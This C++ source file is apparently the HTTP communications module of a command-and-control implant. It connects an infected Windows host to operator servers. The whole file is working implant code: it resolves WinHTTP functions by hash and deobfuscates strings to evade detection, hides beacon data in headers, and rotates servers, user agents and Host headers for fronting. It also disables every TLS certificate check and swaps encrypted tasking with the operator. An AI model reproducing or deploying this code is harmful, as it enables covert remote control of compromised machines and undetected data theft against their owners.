#include "ConnectorHTTP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "StrObfuscate.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"
#include "Agent.h"

extern Agent* g_Agent;

BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

int _atoi(const char* str)
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;

	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while (_isdigest(str[index])) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10)
			return (sign == 1) ? INT_MAX : INT_MIN;

		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}

static BOOL HttpStatusIs200W(const WCHAR* statusBuf)
{
	return statusBuf && statusBuf[0] == L'2' && statusBuf[1] == L'0' && statusBuf[2] == L'0' && statusBuf[3] == 0;
}

static WCHAR* HttpMbToWc(HTTPFUNC* fn, const CHAR* mb)
{
	if (!mb)
		return NULL;
	int n = ApiWin->MultiByteToWideChar(CP_ACP, 0, mb, -1, NULL, 0);
	if (n <= 0)
		return NULL;
	WCHAR* w = (WCHAR*)fn->LocalAlloc(LPTR, (ULONG)(n * (int)sizeof(WCHAR)));
	if (!w)
		return NULL;
	ApiWin->MultiByteToWideChar(CP_ACP, 0, mb, -1, w, n);
	return w;
}

void* ConnectorHTTP::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

void ConnectorHTTP::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorHTTP));
}

ConnectorHTTP::ConnectorHTTP()
{
	this->functions = (HTTPFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetProcAddress = ApiWin->GetProcAddress;
	this->functions->GetLastError = ApiWin->GetLastError;

	CHAR winhttp_c[16];
	AxDeobfuscateToStack(winhttp_c, sizeof(winhttp_c), g_ax_obf_winhttp);

	HMODULE hWinhttp = this->functions->LoadLibraryA(winhttp_c);
	if (hWinhttp) {
		this->functions->WinHttpOpen            = (decltype(WinHttpOpen)*)            GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPOPEN);
		this->functions->WinHttpCloseHandle     = (decltype(WinHttpCloseHandle)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPCLOSEHANDLE);
		this->functions->WinHttpConnect         = (decltype(WinHttpConnect)*)         GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPCONNECT);
		this->functions->WinHttpOpenRequest     = (decltype(WinHttpOpenRequest)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPOPENREQUEST);
		this->functions->WinHttpSendRequest     = (decltype(WinHttpSendRequest)*)     GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPSENDREQUEST);
		this->functions->WinHttpReceiveResponse = (decltype(WinHttpReceiveResponse)*) GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPRECEIVERESPONSE);
		this->functions->WinHttpQueryHeaders    = (decltype(WinHttpQueryHeaders)*)    GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPQUERYHEADERS);
		this->functions->WinHttpReadData        = (decltype(WinHttpReadData)*)        GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPREADDATA);
		this->functions->WinHttpSetOption      = (decltype(WinHttpSetOption)*)       GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPSETOPTION);
		this->functions->WinHttpAddRequestHeaders = (decltype(WinHttpAddRequestHeaders)*) GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPADDREQUESTHEADERS);
		this->functions->WinHttpWriteData      = (decltype(WinHttpWriteData)*)       GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPWRITEDATA);
	}
}

BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beatData, ULONG beatDataSize)
{
	ProfileHTTP profile = *(ProfileHTTP*)profilePtr;
	LPSTR encBeat = b64_encode(beatData, beatDataSize);

	ULONG enc_beat_length = StrLenA(encBeat);
	ULONG param_length    = StrLenA((CHAR*)profile.parameter);
	ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);

	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
	memcpy(HttpHeaders, profile.http_headers, headers_length);
	ULONG index = headers_length;
	memcpy(HttpHeaders + index, profile.parameter, param_length);
	index += param_length;
	HttpHeaders[index++] = ':';
	HttpHeaders[index++] = ' ';
	memcpy(HttpHeaders + index, encBeat, enc_beat_length);
	index += enc_beat_length;
	HttpHeaders[index++] = '\r';
	HttpHeaders[index++] = '\n';
	HttpHeaders[index++] = 0;

	memset(encBeat, 0, enc_beat_length);
	this->functions->LocalFree(encBeat);
	encBeat = NULL;

	this->headers        = HttpHeaders;
	this->server_count   = profile.servers_count;
	this->server_address = (CHAR**)profile.servers;
	this->server_ports   = profile.ports;
	this->ssl            = profile.use_ssl;
	this->http_method    = (CHAR*)profile.http_method;
	this->uri_count      = profile.uri_count;
	this->uris           = (CHAR**)profile.uris;
	this->ua_count       = profile.ua_count;
	this->user_agents    = (CHAR**)profile.user_agents;
	this->hh_count       = profile.hh_count;
	this->host_headers   = (CHAR**)profile.host_headers;
	this->rotation_mode  = profile.rotation_mode;
	this->ans_size       = profile.ans_size;
	this->ans_pre_size   = profile.ans_pre_size;

	this->proxy_type     = profile.proxy_type;
	this->proxy_username = (CHAR*)profile.proxy_username;
	this->proxy_password = (CHAR*)profile.proxy_password;

	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
		WORD port = profile.proxy_port;
		CHAR portStr[6];
		int portIdx = 0;
		if (port == 0) {
			portStr[portIdx++] = '0';
		}
		else {
			CHAR temp[6];
			int tempIdx = 0;
			while (port > 0) {
				temp[tempIdx++] = '0' + (port % 10);
				port /= 10;
			}
			for (int i = tempIdx - 1; i >= 0; i--) {
				portStr[portIdx++] = temp[i];
			}
		}
		portStr[portIdx] = 0;

		ULONG prefixLen = 0;
		if (this->proxy_type == PROXY_TYPE_HTTPS) {
			prefixLen = 8;
		}
		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
		ULONG idx = 0;
		if (this->proxy_type == PROXY_TYPE_HTTPS) {
			this->proxy_url[idx++] = 'h';
			this->proxy_url[idx++] = 't';
			this->proxy_url[idx++] = 't';
			this->proxy_url[idx++] = 'p';
			this->proxy_url[idx++] = 's';
			this->proxy_url[idx++] = ':';
			this->proxy_url[idx++] = '/';
			this->proxy_url[idx++] = '/';
		}
		memcpy(this->proxy_url + idx, profile.proxy_host, hostLen);
		idx += hostLen;
		this->proxy_url[idx++] = ':';
		memcpy(this->proxy_url + idx, portStr, portIdx + 1);
	}

	return TRUE;
}

void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
{
	this->recvSize = 0;
	this->recvData = 0;

	ULONG attempt = 0;
	BOOL  connected = FALSE;
	BOOL  result = FALSE;

	if (this->hConnect) {
		this->functions->WinHttpCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->WinHttpCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}

	while (!connected && attempt < this->server_count) {
		DWORD dwError = 0;

		if (!this->hInternet) {
			WCHAR* wUA = HttpMbToWc(this->functions, this->user_agents[this->ua_index]);
			if (!wUA) {
				attempt++;
				continue;
			}

			DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
			WCHAR* proxyW = NULL;
			if (this->proxy_url != NULL) {
				accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
				proxyW = HttpMbToWc(this->functions, this->proxy_url);
			}

			this->hInternet = this->functions->WinHttpOpen(wUA, accessType, proxyW, WINHTTP_NO_PROXY_BYPASS, 0);
			this->functions->LocalFree(wUA);
			if (proxyW)
				this->functions->LocalFree(proxyW);
		}
		if (this->hInternet) {

			if (!this->hConnect) {
				WCHAR* wHost = HttpMbToWc(this->functions, this->server_address[this->server_index]);
				if (!wHost) {
					this->functions->WinHttpCloseHandle(this->hInternet);
					this->hInternet = NULL;
					attempt++;
					continue;
				}
				INTERNET_PORT port = this->server_ports[this->server_index];
				this->hConnect = this->functions->WinHttpConnect(this->hInternet, wHost, port, 0);
				this->functions->LocalFree(wHost);
			}

			if (this->hConnect)
			{
				WCHAR* wMethod = HttpMbToWc(this->functions, this->http_method);
				WCHAR* wUri = HttpMbToWc(this->functions, this->uris[this->uri_index]);
				if (!wMethod || !wUri) {
					if (wMethod) this->functions->LocalFree(wMethod);
					if (wUri) this->functions->LocalFree(wUri);
				} else {

				DWORD reqFlags = WINHTTP_FLAG_REFRESH;
				if (this->ssl)
					reqFlags |= WINHTTP_FLAG_SECURE;

				HINTERNET hRequest = this->functions->WinHttpOpenRequest(this->hConnect, wMethod, wUri, NULL, WINHTTP_NO_REFERER,
					WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
				this->functions->LocalFree(wMethod);
				this->functions->LocalFree(wUri);

				if (hRequest) {
					if (this->ssl) {
						DWORD dwSec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
							| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
						this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSec, sizeof(dwSec));
					}

					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
						WCHAR* wu = HttpMbToWc(this->functions, this->proxy_username);
						if (wu) {
							DWORD ccb = (DWORD)((StrLenA(this->proxy_username) + 1) * sizeof(WCHAR));
							this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_USERNAME, wu, ccb);
							this->functions->LocalFree(wu);
						}
						if (this->proxy_password != NULL) {
							WCHAR* wp = HttpMbToWc(this->functions, this->proxy_password);
							if (wp) {
								DWORD ccbp = (DWORD)((StrLenA(this->proxy_password) + 1) * sizeof(WCHAR));
								this->functions->WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_PASSWORD, wp, ccbp);
								this->functions->LocalFree(wp);
							}
						}
					}

					CHAR* reqHeaders = this->headers;
					CHAR* tmpHeaders = NULL;
					if (this->hh_count > 0) {
						CHAR* currentHH = this->host_headers[this->hh_index];
						ULONG hhLen = StrLenA(currentHH);
						ULONG baseLen = StrLenA(this->headers);
						WORD currentPort = this->server_ports[this->server_index];

						BOOL hasPort = FALSE;
						for (ULONG i = 0; i < hhLen; i++) {
							if (currentHH[i] == ':') {
								hasPort = TRUE;
								break;
							}
						}

						BOOL needPort = FALSE;
						CHAR portStr[6] = {0};
						ULONG portLen = 0;
						if (!hasPort) {
							if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
								needPort = TRUE;
								WORD port = currentPort;
								if (port == 0) {
									portStr[portLen++] = '0';
								} else {
									CHAR temp[6];
									int tempIdx = 0;
									while (port > 0) {
										temp[tempIdx++] = '0' + (port % 10);
										port /= 10;
									}
									for (int i = tempIdx - 1; i >= 0; i--) {
										portStr[portLen++] = temp[i];
									}
								}
								portStr[portLen] = 0;
							}
						}

						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
						ULONG off = 0;
						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
						if (needPort) {
							tmpHeaders[off++] = ':';
							memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
						}
						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
						memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
						tmpHeaders[off] = 0;
						reqHeaders = tmpHeaders;
					}

					WCHAR* hdrW = HttpMbToWc(this->functions, reqHeaders);
					if (tmpHeaders) {
						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
						this->functions->LocalFree(tmpHeaders);
					}

					BOOL sent = FALSE;
					if (hdrW)
						sent = this->functions->WinHttpSendRequest(hRequest, hdrW, (DWORD)-1, NULL, 0, data_size, 0);
					if (hdrW)
						this->functions->LocalFree(hdrW);

					if (sent && data && data_size > 0) {
						DWORD writtenTotal = 0;
						while (writtenTotal < data_size) {
							DWORD chunk = data_size - writtenTotal;
							if (chunk > 0x1000)
								chunk = 0x1000;
							DWORD wrote = 0;
							if (!this->functions->WinHttpWriteData(hRequest, data + writtenTotal, chunk, &wrote) || wrote == 0)
								break;
							writtenTotal += wrote;
						}
						if (writtenTotal != data_size)
							sent = FALSE;
					}

					connected = sent && this->functions->WinHttpReceiveResponse(hRequest, NULL);

					if (connected) {
						WCHAR statusCode[16];
						DWORD statusLen = sizeof(statusCode);
						result = this->functions->WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE, WINHTTP_HEADER_NAME_BY_INDEX,
							statusCode, &statusLen, WINHTTP_NO_HEADER_INDEX);

						if (result && HttpStatusIs200W(statusCode)) {
							DWORD answerSize = 0;
							DWORD cbCL = sizeof(answerSize);
							result = this->functions->WinHttpQueryHeaders(hRequest,
								WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
								WINHTTP_HEADER_NAME_BY_INDEX, &answerSize, &cbCL, WINHTTP_NO_HEADER_INDEX);

							if (result && answerSize > 0) {
								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);
								ULONG numberReadedBytes = 0;
								while (numberReadedBytes < answerSize) {
									DWORD readedBytes = 0;
									if (!this->functions->WinHttpReadData(hRequest, buffer + numberReadedBytes,
										answerSize - numberReadedBytes, &readedBytes) || !readedBytes)
										break;
									numberReadedBytes += readedBytes;
								}
								this->recvSize = numberReadedBytes;
								this->recvData = buffer;
							}
							else if (this->functions->GetLastError() == ERROR_WINHTTP_HEADER_NOT_FOUND) {
								ULONG numberReadedBytes = 0;
								DWORD readedBytes = 0;
								BYTE* buffer = NULL;
								BYTE chunkBuf[0x1000];

								while (1) {
									readedBytes = 0;
									if (!this->functions->WinHttpReadData(hRequest, chunkBuf, sizeof(chunkBuf), &readedBytes) || readedBytes == 0)
										break;
									if (buffer == NULL) {
										buffer = (BYTE*)this->functions->LocalAlloc(LPTR, readedBytes);
										if (!buffer)
											break;
										memcpy(buffer, chunkBuf, readedBytes);
										numberReadedBytes = readedBytes;
									} else {
										BYTE* nb = (BYTE*)this->functions->LocalReAlloc(buffer, numberReadedBytes + readedBytes, LMEM_MOVEABLE);
										if (!nb)
											break;
										buffer = nb;
										memcpy(buffer + numberReadedBytes, chunkBuf, readedBytes);
										numberReadedBytes += readedBytes;
									}
								}
								if (numberReadedBytes && buffer) {
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
								}
								else if (buffer) {
									this->functions->LocalFree(buffer);
								}
							}
						}
					}
					else {
						dwError = this->functions->GetLastError();
					}
					this->functions->WinHttpCloseHandle(hRequest);
				}
				}
			}

			attempt++;
			if (!connected) {
				if (this->hConnect) {
					this->functions->WinHttpCloseHandle(this->hConnect);
					this->hConnect = NULL;
				}
				if (this->hInternet) {
					this->functions->WinHttpCloseHandle(this->hInternet);
					this->hInternet = NULL;
				}

				this->server_index = (this->server_index + 1) % this->server_count;
			}

			if (this->rotation_mode == 1) {
				this->uri_index = GenerateRandom32() % this->uri_count;
				this->ua_index = GenerateRandom32() % this->ua_count;
				this->server_index = GenerateRandom32() % this->server_count;
				if (this->hh_count > 0)
					this->hh_index = GenerateRandom32() % this->hh_count;
			}
			else {
				this->uri_index = (this->uri_index + 1) % this->uri_count;
				this->ua_index = (this->ua_index + 1) % this->ua_count;
				this->server_index = (this->server_index + 1) % this->server_count;
				if (this->hh_count > 0)
					this->hh_index = (this->hh_index + 1) % this->hh_count;
			}
		}
	}
}

BYTE* ConnectorHTTP::RecvData()
{
	if (this->recvData)
		return this->recvData + this->ans_pre_size;
	else
		return NULL;
}

int ConnectorHTTP::RecvSize()
{
	if (this->recvSize < this->ans_size)
		return 0;

	return this->recvSize - this->ans_size;
}

void ConnectorHTTP::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = NULL;
	}
}

void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	if (plainData && plainSize > 0) {
		EncryptSessionTransport(plainData, plainSize, sessionKey, g_Agent->config->transport_salt);
		this->SendData(plainData, plainSize);
	}
	else {
		this->SendData(NULL, 0);
	}

	if (this->recvSize > 0 && this->recvData) {
		int dataSize = this->RecvSize();
		BYTE* dataPtr = this->RecvData();
		if (dataSize > 0 && dataPtr)
			DecryptSessionTransport(dataPtr, dataSize, sessionKey, g_Agent->config->transport_salt);
	}
}

void ConnectorHTTP::CloseConnector()
{
	if (this->headers) {
		DWORD l = StrLenA(this->headers);
		memset(this->headers, 0, l);
		this->functions->LocalFree(this->headers);
		this->headers = NULL;
	}

	if (this->hConnect) {
		this->functions->WinHttpCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->WinHttpCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}
}
